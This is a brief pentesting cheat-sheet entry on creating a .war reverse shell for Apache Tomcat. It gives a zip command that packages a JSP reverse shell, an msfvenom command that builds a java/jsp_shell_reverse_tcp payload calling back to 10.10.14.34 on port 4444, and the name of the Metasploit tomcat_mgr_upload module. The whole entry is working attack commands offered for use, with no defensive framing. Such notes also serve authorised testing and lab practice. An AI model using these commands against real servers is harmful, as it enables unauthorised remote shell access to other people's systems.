# .war rev shell

---

.war reverse shell can be created with following command:

#### Manual

```
zip webshell.war jsp_reverse-shell.jsp
```


#### Metasploit

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.34 LPORT=4444 -f war > shell.war
```

TomCat Reverse Shell can be created by using the following metasploit module:

```
exploit/multi/http/tomcat_mgr_upload
```
